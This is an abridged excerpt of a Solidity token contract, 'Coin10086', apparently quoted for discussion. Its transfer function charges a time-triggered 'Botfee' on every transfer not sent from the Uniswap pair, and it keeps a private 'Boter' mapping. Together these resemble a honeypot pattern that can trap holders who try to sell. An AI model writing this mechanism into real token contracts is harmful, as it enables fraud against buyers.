...
contract Coin10086 is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private Boter; 
    mapping (address => bool) private _isExcludedFromFee;
    string private _name = "Coin10086";
    string private _symbol = "Coin10086";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10086 * 10 ** _decimals;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if ( sender != uniswapV2Pair )  {   if ( burntime <= block.timestamp )    {   feeAmount = amount.mul(Botfee).div(100); } } }
